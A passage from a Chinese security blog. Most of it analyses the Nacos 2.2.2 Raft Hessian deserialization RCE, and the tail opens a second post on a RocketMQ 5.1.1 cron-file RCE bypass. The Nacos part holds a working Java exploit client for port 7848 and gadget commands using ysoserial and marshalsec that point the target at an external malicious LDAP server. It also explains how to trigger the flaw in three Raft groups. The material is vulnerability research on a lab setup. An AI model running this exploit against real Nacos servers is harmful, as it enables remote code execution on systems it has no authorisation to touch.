class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.grpc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>grpc-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.50.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="定义服务"><a href="#定义服务" class="headerlink" title="定义服务"></a>定义服务</h4><p>在src&#x2F;main目录下创建proto目录，并创建文件helloworld.proto，内容如下：</p>
<figure class="highlight protobuf"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">option</span> java_multiple_files = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">option</span> java_package = <span class="string">&quot;com.example.grpc.api&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">service </span><span class="title class_">Greeter</span> &#123;</span><br><span class="line">  <span class="function"><span class="keyword">rpc</span> SayHello (HelloRequest) <span class="keyword">returns</span> (HelloReply) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">HelloRequest</span> &#123;</span><br><span class="line">  <span class="type">string</span> name = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">HelloReply</span> &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="生成客户端和服务端代码"><a href="#生成客户端和服务端代码" class="headerlink" title="生成客户端和服务端代码"></a>生成客户端和服务端代码</h4><p>可以用Maven插件或者命令行工具生成，我觉得用命令行工具更加清晰，用法参考 <a href="https://grpc.io/docs/languages/java/basics/#generating-client-and-server-code">https://grpc.io/docs/languages/java/basics/#generating-client-and-server-code</a> 和 <a href="https://grpc.io/docs/languages/java/generated-code/">https://grpc.io/docs/languages/java/generated-code/</a> </p>
<h5 id="下载protobuf"><a href="#下载protobuf" class="headerlink" title="下载protobuf"></a>下载protobuf</h5><p><a href="https://github.com/protocolbuffers/protobuf/releases/tag/v23.2">https://github.com/protocolbuffers/protobuf/releases/tag/v23.2</a></p>
<p>下载自己系统对应的版本并放入proto目录</p>
<h5 id="下载protoc-gen-grpc-java"><a href="#下载protoc-gen-grpc-java" class="headerlink" title="下载protoc-gen-grpc-java"></a>下载protoc-gen-grpc-java</h5><p><a href="https://repo1.maven.org/maven2/io/grpc/protoc-gen-grpc-java/1.9.1/">https://repo1.maven.org/maven2/io/grpc/protoc-gen-grpc-java/1.9.1/</a></p>
<p>同样下载和系统对应的版本放入proto目录</p>
<h5 id="生成代码"><a href="#生成代码" class="headerlink" title="生成代码"></a>生成代码</h5><p>cd到proto目录，将下载的protoc-gen-grpc-java重命名为标准名称，添加可执行权限，并运行protoc生成代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> protoc-gen-grpc-java-1.9.1-osx-x86_64.exe protoc-gen-grpc-java</span><br><span class="line"><span class="built_in">chmod</span> +x protoc-gen-grpc-java</span><br><span class="line">./protoc --plugin=protoc-gen-grpc-java --grpc-java_out=../java --java_out=../java helloworld.proto</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230607232842205.png" alt="image-20230607232842205"></p>
<h4 id="创建服务端"><a href="#创建服务端" class="headerlink" title="创建服务端"></a>创建服务端</h4><p>实现具体代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.grpc.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.grpc.api.GreeterGrpc;</span><br><span class="line"><span class="keyword">import</span> com.example.grpc.api.HelloReply;</span><br><span class="line"><span class="keyword">import</span> com.example.grpc.api.HelloRequest;</span><br><span class="line"><span class="keyword">import</span> io.grpc.stub.StreamObserver;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreeterService</span> <span class="keyword">extends</span> <span class="title class_">GreeterGrpc</span>.GreeterImplBase &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">(HelloRequest request, StreamObserver&lt;HelloReply&gt; responseObserver)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> request.getName();</span><br><span class="line">        <span class="type">HelloReply</span> <span class="variable">helloReply</span> <span class="operator">=</span> HelloReply.newBuilder().setMessage(<span class="string">&quot;Hello, &quot;</span>+name).build();</span><br><span class="line">        responseObserver.onNext(helloReply);</span><br><span class="line">        responseObserver.onCompleted();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行服务：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.grpc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.grpc.service.GreeterService;</span><br><span class="line"><span class="keyword">import</span> io.grpc.Server;</span><br><span class="line"><span class="keyword">import</span> io.grpc.ServerBuilder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreeterServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">8888</span>;</span><br><span class="line">        <span class="type">Server</span> <span class="variable">server</span> <span class="operator">=</span> ServerBuilder.forPort(port).addService(<span class="keyword">new</span> <span class="title class_">GreeterService</span>()).build();</span><br><span class="line">        server.start();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Running...&quot;</span>);</span><br><span class="line">        server.awaitTermination();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="创建客户端"><a href="#创建客户端" class="headerlink" title="创建客户端"></a>创建客户端</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.grpc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.grpc.api.GreeterGrpc;</span><br><span class="line"><span class="keyword">import</span> com.example.grpc.api.HelloReply;</span><br><span class="line"><span class="keyword">import</span> com.example.grpc.api.HelloRequest;</span><br><span class="line"><span class="keyword">import</span> io.grpc.Channel;</span><br><span class="line"><span class="keyword">import</span> io.grpc.ManagedChannelBuilder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GreeterClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">8888</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">Channel</span> <span class="variable">channel</span> <span class="operator">=</span> ManagedChannelBuilder.forAddress(host, port).usePlaintext().build();</span><br><span class="line">        GreeterGrpc.<span class="type">GreeterBlockingStub</span> <span class="variable">greeterBlockingStub</span> <span class="operator">=</span> GreeterGrpc.newBlockingStub(channel);</span><br><span class="line">        <span class="type">HelloRequest</span> <span class="variable">helloRequest</span> <span class="operator">=</span> HelloRequest.newBuilder().setName(<span class="string">&quot;leixiao&quot;</span>).build();</span><br><span class="line">        <span class="type">HelloReply</span> <span class="variable">helloReply</span> <span class="operator">=</span> greeterBlockingStub.sayHello(helloRequest);</span><br><span class="line">        System.out.println(helloReply.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>运行客户端后，便完成了一次gRPC请求和响应</p>
<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230607235336573.png" alt="image-20230607235336573"></p>
<h3 id="JRaft"><a href="#JRaft" class="headerlink" title="JRaft"></a>JRaft</h3><p><a href="https://raft.github.io/">Raft</a>是一种共识算法，<a href="https://www.sofastack.tech/projects/sofa-jraft/overview/">JRaft</a>是其Java实现，可以看一下官方的Demo</p>
<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>Dockerfile</p>
<p><a href="https://github.com/alibaba/nacos/releases/download/2.2.2/nacos-server-2.2.2.tar.gz">nacos-server-2.2.2.tar.gz</a></p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> openjdk:<span class="number">8</span>u342-jre</span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="language-bash"> nacos-server-2.2.2.tar.gz /root</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt update &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    apt install net-tools procps -y</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /root</span></span><br></pre></td></tr></table></figure>



<p>docker-compose.yml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">nacos:</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">nacos</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">5005</span><span class="string">:5005</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">7848</span><span class="string">:7848</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8848</span><span class="string">:8848</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPT=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005</span></span><br><span class="line">    <span class="attr">command:</span> </span><br><span class="line">      <span class="bullet">-</span> <span class="string">/bin/sh</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">-c</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line"><span class="string">        bash nacos/bin/startup.sh -m standalone</span></span><br><span class="line"><span class="string">        tail -f nacos/logs/start.out</span></span><br></pre></td></tr></table></figure>



<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>修复代码中添加了Hessian反序列化白名单：<a href="https://github.com/alibaba/nacos/pull/10542/files">https://github.com/alibaba/nacos/pull/10542/files</a></p>
<p>那么最终反序列化的地方很清楚，即： </p>
<p>com.alibaba.nacos.consistency.serialize.HessianSerializer#deserialize </p>
<p>再根据<a href="https://github.com/alibaba/nacos/releases/tag/2.2.3">漏洞描述</a>——“该漏洞仅影响7848端口（默认设置下），一般使用时该端口为Nacos集群间Raft协议的通信端口”，找到可能的漏洞触发点：</p>
<blockquote>
<p>在JRaft中，提交的任务最终将会复制应用到所有 raft 节点上的状态机。onApply 是StateMachine最核心的方法。</p>
</blockquote>
<p>com.alibaba.nacos.core.distributed.raft.NacosStateMachine#onApply</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onApply</span><span class="params">(Iterator iter)</span> &#123;</span><br><span class="line">  	...</span><br><span class="line">    <span class="keyword">if</span> (message <span class="keyword">instanceof</span> WriteRequest) &#123;</span><br><span class="line">        <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> processor.onApply((WriteRequest) message);</span><br><span class="line">        postProcessor(response, closure);</span><br><span class="line">    &#125;</span><br><span class="line">  	...</span><br></pre></td></tr></table></figure>

<p><code>processor.onApply</code>有多个实现，先看如下这个：</p>
<p>com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl#onApply</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Response <span class="title function_">onApply</span><span class="params">(WriteRequest request)</span> &#123;</span><br><span class="line">		<span class="keyword">final</span> <span class="type">InstanceStoreRequest</span> <span class="variable">instanceRequest</span> <span class="operator">=</span> serializer.deserialize(request.getData().toByteArray());</span><br></pre></td></tr></table></figure>



<p>另外在com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl中有个group方法如下，<code>NAMING_PERSISTENT_SERVICE_GROUP_V2</code>的值即<code>naming_persistent_service_v2</code>会在后面客户端的代码中用到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">group</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Constants.NAMING_PERSISTENT_SERVICE_GROUP_V2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>group()</code>是作为groupId用于创建RaftGroupService：</p>
<p>com.alibaba.nacos.core.distributed.raft.JRaftServer#createMultiRaftGroup</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">createMultiRaftGroup</span><span class="params">(Collection&lt;RequestProcessor4CP&gt; processors)</span> &#123;</span><br><span class="line">		...</span><br><span class="line">    <span class="keyword">for</span> (RequestProcessor4CP processor : processors) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">groupName</span> <span class="operator">=</span> processor.group();</span><br><span class="line">		...</span><br><span class="line">        <span class="type">RaftGroupService</span> <span class="variable">raftGroupService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RaftGroupService</span>(groupName, localPeerId, copy, rpcServer, <span class="literal">true</span>);</span><br><span class="line">		...</span><br></pre></td></tr></table></figure>



<h3 id="构造请求"><a href="#构造请求" class="headerlink" title="构造请求"></a>构造请求</h3><p>在源码中并没有<code>WriteRequest</code>，<code>Response</code>等类的定义，他们都在nacos-2.2.2&#x2F;consistency&#x2F;src&#x2F;main&#x2F;proto&#x2F;consistency.proto 文件中，将该文件复制到文章开头创建的 grpc_demo 项目的proto目录中，借助protoc命令行工具生成代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./protoc --plugin=protoc-gen-grpc-java --grpc-java_out=../java --java_out=../java consistency.proto</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230608143518176.png" alt="image-20230608143518176"></p>
<p>然后参考JRaft给出的<a href="https://www.sofastack.tech/projects/sofa-jraft/counter-example/">Demo</a>，可以写出相应的客户端代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alipay.sofa<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jraft-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alipay.sofa<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rpc-grpc-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.nacos.consistency.entity.WriteRequest;</span><br><span class="line"><span class="keyword">import</span> com.alipay.sofa.jraft.entity.PeerId;</span><br><span class="line"><span class="keyword">import</span> com.alipay.sofa.jraft.option.CliOptions;</span><br><span class="line"><span class="keyword">import</span> com.alipay.sofa.jraft.rpc.impl.GrpcClient;</span><br><span class="line"><span class="keyword">import</span> com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;</span><br><span class="line"><span class="keyword">import</span> com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;</span><br><span class="line"><span class="keyword">import</span> com.google.protobuf.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">address</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1:7848&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] poc = getPoc();</span><br><span class="line"></span><br><span class="line">        <span class="type">CliClientServiceImpl</span> <span class="variable">cliClientService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CliClientServiceImpl</span>();</span><br><span class="line">        cliClientService.init(<span class="keyword">new</span> <span class="title class_">CliOptions</span>());</span><br><span class="line">        <span class="type">PeerId</span> <span class="variable">leader</span> <span class="operator">=</span> PeerId.parsePeer(address);</span><br><span class="line"></span><br><span class="line">        <span class="type">WriteRequest</span> <span class="variable">request</span> <span class="operator">=</span> WriteRequest.newBuilder()</span><br><span class="line">                .setGroup(<span class="string">&quot;naming_persistent_service_v2&quot;</span>)</span><br><span class="line">                .setData(ByteString.copyFrom(poc))</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        <span class="type">GrpcClient</span> <span class="variable">grpcClient</span> <span class="operator">=</span> (GrpcClient) cliClientService.getRpcClient();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射添加WriteRequest，不然会抛出异常</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">parserClassesField</span> <span class="operator">=</span> GrpcClient.class.getDeclaredField(<span class="string">&quot;parserClasses&quot;</span>);</span><br><span class="line">        parserClassesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Map&lt;String, Message&gt; parserClasses = (Map) parserClassesField.get(grpcClient);</span><br><span class="line">        parserClasses.put(WriteRequest.class.getName(),WriteRequest.getDefaultInstance());</span><br><span class="line">        MarshallerHelper.registerRespInstance(WriteRequest.class.getName(),WriteRequest.getDefaultInstance());</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">res</span> <span class="operator">=</span> grpcClient.invokeSync(leader.getEndpoint(), request,<span class="number">5000</span>);</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h3><p>可以在关键的几处下断点观察：</p>
<p>com.alibaba.nacos.core.distributed.raft.NacosStateMachine#onApply</p>
<p>com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl#onApply</p>
<p>com.alibaba.nacos.consistency.serialize.HessianSerializer#deserialize(byte[])</p>
<h3 id="Gadget"><a href="#Gadget" class="headerlink" title="Gadget"></a>Gadget</h3><p>目前只是成功让代码走到反序列化的点，还需要构造Hession反序列化的POC：</p>
<ol>
<li>通过<a href="https://github.com/l3yx/JNDI-Injection-LDAP-Deserialization">JNDI-Injection-LDAP-Deserialization</a>启动恶意ldap服务，并使用y4er师傅改的<a href="https://github.com/Y4er/ysoserial">ysoserial</a>中Jackson这条链</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar JNDI-Injection-LDAP-Deserialization-1.0-SNAPSHOT.jar 1389 `java -jar ~/Tools/Y4er_ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar Jackson <span class="string">&#x27;touch /tmp/success&#x27;</span>|<span class="built_in">base64</span>`</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>然后通过<a href="https://github.com/mbechler/marshalsec">marshasec</a>生成JDNI注入的POC</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian2 SpringPartiallyComparableAdvisorHolder ldap://host.docker.internal:1389/exp |<span class="built_in">base64</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609132153478.png" alt="image-20230609132153478"></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>其实前面很多分析过程是有省略的，感觉都写下来会很乱，所以挑了一条漏洞的链路完成漏洞的复现，准备在后面补充一些细节</p>
<h3 id="只能打一次？"><a href="#只能打一次？" class="headerlink" title="只能打一次？"></a>只能打一次？</h3><p>按前文的POC第一次攻击7848端口的话，调用栈如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deserialize(byte[]), HessianSerializer</span><br><span class="line">onApply(WriteRequest), PersistentClientOperationServiceImpl </span><br><span class="line">onApply(Iterator), NacosStateMachine</span><br><span class="line">doApplyTasks(IteratorImpl), FSMCallerImpl</span><br><span class="line">doCommitted(long), FSMCallerImpl</span><br><span class="line">runApplyTask(FSMCallerImpl$ApplyTask, long, boolean), FSMCallerImpl</span><br><span class="line">access$100(FSMCallerImpl, FSMCallerImpl$ApplyTask, long, boolean), FSMCallerImpl</span><br><span class="line">onEvent(FSMCallerImpl$ApplyTask, long, boolean), FSMCallerImpl$ApplyTaskHandler</span><br><span class="line">onEvent(Object, long, boolean), FSMCallerImpl$ApplyTaskHandler</span><br><span class="line">run(), BatchEventProcessor</span><br></pre></td></tr></table></figure>

<p>JRaft客户端得到的返回数据是反序列化中的异常信息，说明已经完成反序列化过程，这里没有问题</p>
<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609140240776.png" alt="image-20230609140240776"></p>
<p>但是同样的POC，运行第二次，返回信息是：</p>
<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609140705427.png" alt="image-20230609140705427"></p>
<p>并且代码无法进入上述调用栈，感觉这里可能和Raft的算法或者协议有关，重启环境也不行。需要销毁环境，重新创建：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose down; docker-compose up -d</span><br></pre></td></tr></table></figure>



<h3 id="多条触发链路"><a href="#多条触发链路" class="headerlink" title="多条触发链路"></a>多条触发链路</h3><p>在前文中提到的com.alibaba.nacos.core.distributed.raft.JRaftServer#createMultiRaftGroup中创建RaftGroupService的地方下断点，并且对环境进行销毁重启，在重启的同时IDEA连上调试</p>
<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609141722996.png" alt="image-20230609141722996"></p>
<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609141748714.png" alt="image-20230609141748714"></p>
<p><img src="/2023/06/09/Nacos-Raft-Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20230609141822866.png" alt="image-20230609141822866"></p>
<p>会发现其实不只存在一个RaftGroupService：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">naming_persistent_service_v2</span><br><span class="line">naming_instance_metadata</span><br><span class="line">naming_service_metadata</span><br></pre></td></tr></table></figure>



<p>他们分别对应的”onApply”如下：</p>
<p>com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl#onApply</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Response <span class="title function_">onApply</span><span class="params">(WriteRequest request)</span> &#123;</span><br><span class="line">		<span class="keyword">final</span> <span class="type">InstanceStoreRequest</span> <span class="variable">instanceRequest</span> <span class="operator">=</span> serializer.deserialize(request.getData().toByteArray());</span><br></pre></td></tr></table></figure>



<p>com.alibaba.nacos.naming.core.v2.metadata.InstanceMetadataProcessor#onApply</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Response <span class="title function_">onApply</span><span class="params">(WriteRequest request)</span> &#123;</span><br><span class="line">    MetadataOperation&lt;InstanceMetadata&gt; op = serializer.deserialize(request.getData().toByteArray(), processType);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>



<p>com.alibaba.nacos.naming.core.v2.metadata.ServiceMetadataProcessor#onApply</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Response <span class="title function_">onApply</span><span class="params">(WriteRequest request)</span> &#123;</span><br><span class="line">		MetadataOperation&lt;ServiceMetadata&gt; op = serializer.deserialize(request.getData().toByteArray(), processType);</span><br><span class="line">  	...</span><br></pre></td></tr></table></figure>



<p>都有反序列化操作，所以，打完一个”group”后，可以打另外一个”group”，这样漏洞至少可以打3次：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">WriteRequest</span> <span class="variable">request</span> <span class="operator">=</span> WriteRequest.newBuilder()</span><br><span class="line">        .setGroup(<span class="string">&quot;naming_persistent_service_v2&quot;</span>)</span><br><span class="line">        <span class="comment">//.setGroup(&quot;naming_instance_metadata&quot;)</span></span><br><span class="line">        <span class="comment">//.setGroup(&quot;naming_service_metadata&quot;)</span></span><br><span class="line">        .setData(ByteString.copyFrom(poc))</span><br><span class="line">        .build();</span><br></pre></td></tr></table></figure>





<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://y4er.com/posts/nacos-hessian-rce/">https://y4er.com/posts/nacos-hessian-rce/</a></p>
]]></content>
      <tags>
        <tag>漏洞分析</tag>
        <tag>Nacos</tag>
      </tags>
  </entry>
  <entry>
    <title>RocketMQ 5.1.1写计划任务RCE</title>
    <url>/2023/06/15/RocketMQ-5-1-1%E5%86%99%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1RCE/</url>
    <content><![CDATA[<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33246">CVE-2023-33246</a> 是通过<code>updateBrokerConfig</code>更新Broker的<code>filterServerNums</code>和<code>rocketmqHome</code>这两项配置进行RCE的（<code>rocketmqHome</code>会被拼接到命令中执行，<code>filterServerNums</code>&gt;0 是进入命令执行的前提条件）</p>
<p>修复的逻辑是直接删除相关代码</p>
<p>但从仓库的修复代码来看，还存在另一处RCE的点，不过官方只发布了上述一个CVE编号</p>
<span id="more"></span>

<p>另一处RCE的修复代码为：<a href="https://github.com/apache/rocketmq/pull/6733/files">https://github.com/apache/rocketmq/pull/6733/files</a></p>
<p>修复的逻辑是不允许远程更新以下配置项：</p>
<blockquote>
<p>brokerConfigPath<br>configStorePath<br>kvConfigPath<br>configStorePathName</p>
</blockquote>
<p>而这些配置项都是指定不同配置文件的存储路径，那么RCE的方式就是在root权限的前提下将配置文件的路径改为cron定时任务路径</p>
<p>这个RCE的点随 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33246">CVE-2023-33246</a> 一起于 RocketMQ 5.1.1 的发布而修复</p>
<p>然而官方的这种修复方式存在绕过</p>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>受影响的服务有两个，Broker 和 BrokerContainer，利用条件不同：</p>
<ul>
<li>Broker （默认端口10911）<ul>
<li>root权限运行</li>
<li>重启一次</li>
<li>cron服务</li>
</ul>
</li>
<li>BrokerContainer （默认端口10811）<ul>
<li>root权限运行</li>
<li>cron服务</li>
</ul>
</li>
</ul>
